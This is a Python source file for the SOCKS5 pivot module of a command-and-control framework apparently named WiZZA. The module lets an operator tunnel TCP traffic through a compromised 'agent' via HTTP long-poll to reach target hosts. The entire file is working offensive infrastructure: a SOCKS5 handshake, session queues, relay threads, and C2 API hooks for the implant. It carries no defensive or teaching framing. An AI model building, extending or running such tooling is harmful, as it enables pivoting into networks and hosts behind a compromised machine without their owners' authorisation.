"""
SOCKS5 Proxy Pivot — tunnels TCP through a WiZZA agent via HTTP long-poll.
Operator connects proxychains/browser to localhost:1080, traffic routes through agent.

Architecture:
  Operator tool → C2:1080 (SOCKS5) → HTTP queue → Agent → Target host
                                    ← HTTP data  ←       ←
"""
import socket, threading, struct, time, queue, uuid, os
from collections import defaultdict

# ── Per-agent proxy sessions ──────────────────────────────────────────────────
# sessions[aid][sid] = {
#   "host": str, "port": int,
#   "to_agent": queue.Queue(),    # data operator→agent
#   "from_agent": queue.Queue(),  # data agent→operator
#   "sock": socket (operator-side SOCKS5 conn),
#   "state": "pending"|"open"|"closed"
# }
sessions: dict = {}
_lock = threading.Lock()

SOCKS_PORT = int(os.environ.get("SOCKS_PORT", 1080))

def _new_sid(): return uuid.uuid4().hex[:12]

# ── SOCKS5 handshake helpers ──────────────────────────────────────────────────
def _socks5_handshake(conn):
    """Return (host, port) or raise on failure."""
    # Auth negotiation
    data = conn.recv(512)
    if not data or data[0] != 5:
        raise ValueError("Not SOCKS5")
    conn.send(b"\x05\x00")  # no auth
    # Request
    req = conn.recv(512)
    if len(req) < 7 or req[1] != 1:  # CONNECT only
        conn.send(b"\x05\x07\x00\x01" + b"\x00"*6)
        raise ValueError("Only CONNECT supported")
    atyp = req[3]
    if atyp == 1:    # IPv4
        host = socket.inet_ntoa(req[4:8])
        port = struct.unpack(">H", req[8:10])[0]
    elif atyp == 3:  # Domain
        nlen = req[4]
        host = req[5:5+nlen].decode()
        port = struct.unpack(">H", req[5+nlen:7+nlen])[0]
    elif atyp == 4:  # IPv6
        host = socket.inet_ntop(socket.AF_INET6, req[4:20])
        port = struct.unpack(">H", req[20:22])[0]
    else:
        conn.send(b"\x05\x08\x00\x01" + b"\x00"*6)
        raise ValueError(f"Unknown atyp {atyp}")
    # Reply: success (agent will do actual connect)
    conn.send(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
    return host, port

def _relay_operator(conn, sid, aid):
    """Forward data from operator socket to agent queue."""
    sess = sessions.get(aid, {}).get(sid)
    if not sess: return
    conn.settimeout(0.5)
    try:
        while sess["state"] != "closed":
            try:
                data = conn.recv(16384)
                if not data:
                    break
                sess["to_agent"].put(data)
            except socket.timeout:
                continue
            except: break
    finally:
        sess["state"] = "closed"
        try: conn.close()
        except: pass

def _relay_agent_to_op(conn, sid, aid):
    """Forward data from agent queue to operator socket."""
    sess = sessions.get(aid, {}).get(sid)
    if not sess: return
    try:
        while sess["state"] != "closed":
            try:
                data = sess["from_agent"].get(timeout=0.5)
                conn.sendall(data)
            except queue.Empty:
                continue
            except: break
    except: pass

def handle_socks_client(conn, addr, aid):
    """Handle one SOCKS5 client connection."""
    try:
        host, port = _socks5_handshake(conn)
    except Exception as e:
        conn.close(); return
    sid = _new_sid()
    sess = {
        "host": host, "port": port,
        "to_agent":   queue.Queue(),
        "from_agent": queue.Queue(),
        "sock": conn,
        "state": "pending",
        "created": time.time()
    }
    with _lock:
        if aid not in sessions: sessions[aid] = {}
        sessions[aid][sid] = sess
    # Wait for agent to open connection (up to 15s)
    for _ in range(30):
        if sess["state"] == "open": break
        if sess["state"] == "closed": conn.close(); return
        time.sleep(0.5)
    if sess["state"] != "open":
        conn.close()
        with _lock: sessions.get(aid, {}).pop(sid, None)
        return
    # Bidirectional relay
    t1 = threading.Thread(target=_relay_operator, args=(conn, sid, aid), daemon=True)
    t2 = threading.Thread(target=_relay_agent_to_op, args=(conn, sid, aid), daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()
    with _lock: sessions.get(aid, {}).pop(sid, None)

class SOCKSServer:
    """Listens on localhost:1080, routes connections through a specific agent."""
    def __init__(self, aid, port=SOCKS_PORT):
        self.aid = aid
        self.port = port
        self._srv = None
        self._thread = None
        self.running = False

    def start(self):
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind(("127.0.0.1", self.port))
        self._srv.listen(20)
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while self.running:
            try:
                conn, addr = self._srv.accept()
                threading.Thread(target=handle_socks_client,
                                 args=(conn, addr, self.aid), daemon=True).start()
            except: pass

    def stop(self):
        self.running = False
        try: self._srv.close()
        except: pass

# Active SOCKS servers: {aid: SOCKSServer}
_active: dict = {}

def start_proxy(aid, port=SOCKS_PORT):
    stop_proxy(aid)
    srv = SOCKSServer(aid, port)
    srv.start()
    _active[aid] = srv
    return port

def stop_proxy(aid):
    if aid in _active:
        _active[aid].stop()
        del _active[aid]

def list_sessions(aid):
    return [
        {"sid": s, "host": v["host"], "port": v["port"],
         "state": v["state"], "age": int(time.time()-v["created"])}
        for s, v in sessions.get(aid, {}).items()
    ]

# ── C2 HTTP API helpers (called from c2_server.py) ───────────────────────────
def agent_poll_proxy(aid):
    """
    Called when agent polls /proxy/poll?id=AID.
    Returns list of pending sessions needing connection.
    """
    pending = []
    for sid, sess in sessions.get(aid, {}).items():
        if sess["state"] == "pending":
            pending.append(f"CONNECT {sid} {sess['host']} {sess['port']}")
    return "\n".join(pending) if pending else "NONE"

def agent_connected(aid, sid):
    """Agent reports it successfully connected to target host."""
    with _lock:
        sess = sessions.get(aid, {}).get(sid)
        if sess: sess["state"] = "open"

def agent_data_from(aid, sid, data: bytes):
    """Agent sends data from target host → put in from_agent queue."""
    with _lock:
        sess = sessions.get(aid, {}).get(sid)
    if sess and sess["state"] == "open":
        sess["from_agent"].put(data)

def agent_data_to(aid, sid) -> bytes:
    """C2 drains operator→agent queue for agent to consume."""
    with _lock:
        sess = sessions.get(aid, {}).get(sid)
    if not sess: return b""
    chunks = []
    try:
        while True: chunks.append(sess["to_agent"].get_nowait())
    except queue.Empty: pass
    return b"".join(chunks)

def agent_close(aid, sid):
    """Agent closed the connection to target."""
    with _lock:
        sess = sessions.get(aid, {}).get(sid)
        if sess:
            sess["state"] = "closed"
            sessions.get(aid, {}).pop(sid, None)
